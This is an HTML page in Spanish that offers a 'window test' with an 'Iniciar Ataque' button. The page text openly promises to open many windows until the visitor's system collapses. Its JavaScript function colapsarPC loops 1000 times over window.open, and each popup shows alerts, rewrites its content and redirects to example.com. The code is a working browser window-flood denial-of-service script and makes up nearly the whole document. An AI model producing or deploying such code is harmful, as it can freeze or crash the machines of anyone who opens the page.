<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Prueba de Ventanas</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f8f9fa;
            padding: 50px;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            display: inline-block;
        }
        .btn {
            background: red;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .btn:hover {
            background: darkred;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>⚠️ Prueba de Ventanas</h2>
        <p>Haz clic en el botón y abriré muchas ventanas hasta colapsar tu sistema.</p>
        <button class="btn" onclick="colapsarPC()">Iniciar Ataque</button>
    </div>

    <script>
        function ejecutarAcciones() {
            // Acción 1: Cambiar el fondo de la ventana
            document.body.style.backgroundColor = "lightcoral";
            
            // Acción 2: Cambiar el título de la ventana
            document.title = "Ventana en acción!";
            
            // Acción 3: Mostrar un mensaje en la ventana
            alert("¡Esta ventana está ejecutando acciones!");

            // Acción 4: Redirigir a una nueva URL
            window.location.href = "https://www.example.com";  // Cambia a cualquier URL que desees

            // Acción 5: Cambiar el contenido de la ventana (en el cuerpo de la página)
            document.body.innerHTML = "<h1>¡Acciones ejecutadas!</h1><p>La ventana ha realizado varias acciones.</p>";
        }

        function colapsarPC() {
            let cantidad = 1000; // Número de ventanas a abrir
            for (let i = 0; i < cantidad; i++) {
                let nuevaVentana = window.open("about:blank", "_blank", "width=400,height=400");

                // Ejecutar las acciones en cada nueva ventana abierta
                nuevaVentana.onload = function() {
                    nuevaVentana.document.write("<html><head><title>Ventana en Acción</title></head><body><h1>Preparando acciones...</h1></body></html>");
                    nuevaVentana.document.close();
                    nuevaVentana.ejecutarAcciones = ejecutarAcciones;
                    nuevaVentana.ejecutarAcciones();
                };
            }
        }
    </script>
</body>
</html>
